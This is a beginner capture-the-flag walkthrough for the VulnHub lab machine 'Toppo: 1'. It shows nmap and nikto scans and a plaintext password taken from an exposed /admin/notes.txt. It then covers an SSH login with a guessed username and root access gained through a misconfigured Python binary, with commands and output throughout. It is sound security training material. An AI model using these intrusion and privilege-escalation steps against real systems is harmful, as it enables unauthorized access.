# Toppo: 1 CTF Walkthrough
[VulnHub URL]
## Description:
```
The Machine isn't hard to own and don't require advanced exploitation .
Level : Beginner
DHCP : activated
Inside the zip you will find a vmdk file , and I think you will be able to use it with any usual virtualization software ( tested with Virtualbox) .
If you have any question : my twitter is [h4d3sw0rm]
Happy Hacking ! 
```
## Contents:

	1. Initial scanning & recon
	2. Obtaining credentials from a leftover file
	3. Getting root thanks to misconfigured permissions

### Initial scanning & recon

I generally use three tools during my initial scanning phase, before I begin to dig into specific services and manual analysis, these three are:
	
 - Nmap
 - Nikto
 - Dirb

Nmap:

```
$ nmap -A -p- -T5 192.168.56.101

Starting Nmap 7.40 ( https://nmap.org ) at 2018-07-26 04:58 BST
Nmap scan report for 192.168.56.101
Host is up (0.0020s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|_  256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          55005/udp  status
|_  100024  1          59668/tcp  status
59668/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.55 seconds
```

Nikto:

```
$ perl nikto.pl -host http://192.168.56.101/
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        80
+ Start Time:         2018-07-26 05:05:53 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2018-07-26 05:06:17 (GMT1) (24 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
The Dirb report didn't yield anything overly important, so it has been omitted from the walkthrough.

From these scans I can determine that the port with the highest chance of exploitability is the HTTP (80) port, the SSH (22) port may come in handy later when valid credentials have been discovered.
The Nikto and Dirb reports both uncovered an `/admin/` directory which is accessible to unauthenticated users.

### Obtaining credentials from a leftover file

Browsing to the `/admin/` directory reveals a file called `notes.txt`:
```
Note to myself :

I need to change my password :/ **12345ted123** is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
```

So now there's a password available for later, but a username and point of entry is still needed, as there is no evident login form on the website.
Obviously the only visible entry point is through the SSH service.
Considering the admin isn't very computer literate, we can assume that he does what many others like him do, put his username / real name in the password...
**Ted** definitely stands out.
```
$ ssh ted@192.168.56.101
ted@192.168.56.101's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jul 25 23:18:19 2018 from 192.168.56.1
ted@Toppo:~$
```
And of course it works...
```
ted@Toppo:~$ whoami
ted
ted@Toppo:~$ id
uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
ted@Toppo:~$ cd /root
-bash: cd: /root: Permission denied
```
Sadly Ted isn't root, which is what I need to complete this challenge.

### Getting root thanks to misconfigured permissions

I'm not great with post-exploitation if I'm completely honest and privilege escalation has never been my primary skill.
However, I know to always look for programs that allow me to write and execute system commands on the box.
For example, with this box I quickly checked for Python:
```
ted@Toppo:~$ python --version
Python 2.7.9
ted@Toppo:/$ python
Python 2.7.9 (default, Aug 13 2016, 16:41:35)
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("whoami")
root
```
Great, so Python can execute commands as root...
Time to check the `/root/` directory:
```
>>> os.system("cd /root && ls -alt")
total 24
-rw-------  1 root root   53 Apr 15 12:28 .bash_history
drwx------  2 root root 4096 Apr 15 11:40 .
-rw-r--r--  1 root root  397 Apr 15 10:19 flag.txt
drwxr-xr-x 21 root root 4096 Apr 15 10:02 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
0
```
`flag.txt` is the target for this challenge, so to complete it:
```
>>> os.system("cat /root/flag.txt")
_________                                  
|  _   _  |                                
|_/ | | \_|.--.   _ .--.   _ .--.    .--.  
   | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \
  _| |_ | \__. | | \__/ | | \__/ || \__. |
 |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
                [__|     [__|              




Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}



0
```

[VulnHub URL]: <https://www.vulnhub.com/entry/toppo-1,245/>
[h4d3sw0rm]: <https://twitter.com/h4d3sw0rm>
